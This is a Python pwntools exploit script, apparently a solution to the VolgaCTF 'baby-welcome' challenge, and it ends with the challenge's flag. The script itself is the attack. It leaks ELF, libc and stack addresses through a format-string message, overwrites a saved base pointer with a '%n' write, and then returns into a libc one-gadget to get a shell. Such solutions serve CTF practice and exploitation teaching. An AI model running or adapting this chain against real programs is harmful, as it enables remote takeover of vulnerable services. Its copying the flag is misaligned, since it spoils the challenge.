#!/usr/bin/env python3

from pwn import *

context( os="linux", arch="amd64" )
elf = ELF( "app/baby-welcome", False )
libc = ELF( "libc.so.6", False )

# s = remote( "baby-welcome-1.q.2025.volgactf.ru", 31338 )
s = remote( "localhost", 31338 )
# s = process(elf.path)


def main():

    # Prepare reciever
    register( b'alice', b'alice'), logout()
    
    # Prepare sender
    register( b'bob', b'bob')
    # Send leak payload
    send( b'alice', b'%7$p.%8$p.%14$p' ), logout()
    
    # Trigger sended leak payload
    login(b'alice', b'alice')
    leak = read()

    addresses = [ eval(address) for address in leak.split(b'.') ]
    elf.address =   addresses[0] - 0x2408b950
    libc.address =  addresses[2] - 0x2124e0
    stack_addr =    addresses[1] - 0xb0 + 0x40

    s.success( f"🎁 Elf base:    {hex(elf.address)}" )
    s.success( f"🎁 Libc base:   {hex(libc.address)}" )
    s.success( f"🎁 Stack addr:  {hex(stack_addr)}" )

    # Payload to rewrite rbp to future one gadget
    payload = fit({
        0x0:    '%{}c%8$hn'.format(
                    stack_addr % 0x10000 - 12,
                ).encode(),
    })
    send( b'bob', payload ), logout()
    
    # One gadget
    payload =  b'bob'.ljust(8, b'\00')
    payload += cyclic(56)
    payload += p64(stack_addr)              # rbp
    payload += p64(libc.address + 0xf6292)  # ret → one gadget

    # Put one gadget payload on stack
    # & trigger sended rewrite rbp payload
    login( b'bob', payload ), read()

    # Trigger one gadget
    s.sendlineafter( b'> ', b'5' )  # x2 exit → ret to one gadget
    # Shell
    s.interactive()


def register(username: bytes, password: bytes):
    s.sendlineafter( b'> ',         b'1' )
    s.sendlineafter( b'Login: ',    username )
    s.sendlineafter( b'Password: ', password )


def logout():
    s.sendlineafter( b'> ', b'3' )


def send(reciever: bytes, message: bytes):
    s.sendlineafter( b'> ',        b'1' )
    s.sendlineafter( b'Login: ',   reciever )
    s.sendlineafter( b'Message: ', message )


def login(username: bytes, password: bytes):
    s.sendlineafter( b'> ',         b'2' )
    s.sendlineafter( b'Login: ',    username )
    s.sendlineafter( b'Password: ', password )


def read():
    s.sendlineafter( b'> ', b'2' )
    s.recvuntil( b': ' )
    return s.recvline(False)


if __name__ == "__main__":
    main()

# VolgaCTF{%s_1_l1k3_3@5y_t@5k5_y0u_t00?_b2ffac756ffd1df0e033eab50f3c0ba6}
